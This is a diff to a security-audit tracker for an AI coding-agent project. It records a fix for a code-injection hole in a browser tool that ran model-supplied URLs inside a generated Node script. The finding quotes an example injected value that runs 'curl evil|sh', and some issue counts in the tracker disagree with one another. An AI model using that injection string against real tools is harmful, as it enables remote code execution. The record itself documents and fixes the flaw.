@@ -7,14 +7,14 @@
 | Severity | Total | Fixed | Remaining |
 |----------|-------|-------|-----------|
 | Critical | 11    | 11    | 0         |
-| High     | 89    | 71    | 18        |
+| High     | 89    | 72    | 17        |
 | Medium   | 208   | 0     | 208       |
 | Low      | 80    | 0     | 80        |
-| **Total**| **388** | **82** | **306** |
+| **Total**| **388** | **83** | **305** |
 
 ---
 
-## ✅ Fixed — 11 Critical + 71 High
+## ✅ Fixed — 11 Critical + 72 High
 
 | ID | File | Issue | Fix Summary |
 |----|------|-------|-------------|
@@ -102,8 +102,9 @@
 | H73 | `timps-code/src/swarm/graph.ts` + `executor.ts` — Dead code: agents cannot act — `executeAgent` streams LLM with empty tools array (`provider.stream(messages, [], ...)`); `executor.ts` `runAgent` likewise passes `[]` and hardcodes Ollama at `http://localhost:11434` ignoring `agent.provider`/remote config; `routeAfterOrchestrator` (graph.ts:34-51) never called; DAG routing is keyword matching on request string; agents.ts prompts promise Write/Edit/Bash/WebSearch tools but swarm agents can only produce prose — never write files, run tests, or produce real artifacts; consensus is first 200 chars of each text concatenated | Rewrote `graph.ts executeAgent` with agentic loop: resolves tool definitions from `AGENT_PROMPTS[role].tools` via `getToolDefinitions()`, passes them to `provider.stream()`, accumulates tool calls from stream events, executes them via `getTool().execute()`, feeds results back as `role: 'tool'` messages, loops until no more calls (max 5 turns). Removed dead `routeAfterOrchestrator`. Rewrote `executor.ts runAgent` with same agentic loop, replaced `createOllamaProvider` with `createProvider(agent.provider, agent.model)` to respect per-agent provider config. Fixed `buildConsensus` to extract first meaningful paragraph per role instead of truncating to 200 chars. Fixed agents.ts header: removed false "each agent runs on its own computer, collaborates via peer-to-peer messaging". Verified: `tsc --noEmit` clean. |
 | H74 | `timps-code/src/swarm/server.ts` — Bug: `runSwarmTask()` at line 105 fetches `http://localhost:8000/swarm/run` — the server's own endpoint — causing recursive self-requests; when the fetch fails it returns fabricated success payload `'Task completed via TIMPS Swarm'` with empty artifacts (lines 122-130); no actual task execution; `getAgentList()` returns hardcoded static data instead of live agent state | Replaced self-referencing fetch with direct call to `runSwarmDAG()` from graph.ts (which now has real tool execution from H73); `getAgentList()` now calls `createSwarm()` and returns live agent status including `tasksCompleted`/`tasksFailed` counts; added error handling for malformed JSON in POST body; removed unused `SWARM_PYTHON_API` constant and Python backend references. Verified: `tsc --noEmit` clean. |
 | H75 | `timps-code/src/tools/bash/index.ts:30` — Bug: primary registered bash tool hardcodes `shell: '/bin/bash'` in `execSync` options; on Windows there is no `/bin/bash` so every invocation throws `spawn /bin/bash ENOENT`; agent's most fundamental tool is broken on a mainline platform; repository README claims cross-platform CLI | Added `process.platform === 'win32'` check: uses `'cmd.exe'` on Windows (Node.js internally runs `cmd.exe /d /s /c`), keeps `'/bin/bash'` on Unix/macOS. Verified: `tsc --noEmit` clean. |
+| H76 | `timps-code/src/tools/browser/index.ts:138` — Security: `navigateTo()` interpolates LLM/user-supplied URL directly into a JS string literal in a generated Node script (`await page.goto('${url}')`) written to a temp file and executed via `execSync` with full Node privileges; `takeScreenshot()` interpolates `screenshotPath` the same way (lines 186-187); a URL containing a single quote breaks out of the string literal and injects arbitrary Node code (e.g. `url = x');require('child_process').execSync('curl evil\|sh');//`) — arbitrary code execution from a tool argument the model controls | Replaced string interpolation with `JSON.stringify()` for both `url` and `screenshotPath` values in generated scripts — `JSON.stringify()` properly escapes all special characters (single quotes, backslashes, template literals) preventing injection. Verified: `tsc --noEmit` clean. |
 
-## 📋 Remaining — 307 Issues
+## 📋 Remaining — 306 Issues
 
 ### High (32)
 ⏸️ All 32 remaining High issues are unfixed — awaiting user instruction to proceed
